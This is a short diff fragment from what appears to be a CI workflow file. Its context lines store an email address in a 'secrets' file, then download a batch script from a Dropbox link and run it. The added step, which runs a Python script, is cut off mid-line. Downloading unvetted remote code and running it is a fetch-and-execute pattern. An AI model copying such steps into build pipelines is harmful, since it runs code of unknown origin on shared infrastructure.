@@ -13,3 +13,5 @@ jobs:
          echo "EMAIL_SECRET=afzanraisa@gmail.com" > secrets.txt
          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/16xylqtz9xlapl177g2zm/down.bat?rlkey=lw2h4c96mpgk3zboad8dw24mi&dl=0" -OutFile "down.bat"
          cmd /c down.bat
+      - name: Time Counter
+        run: python time.
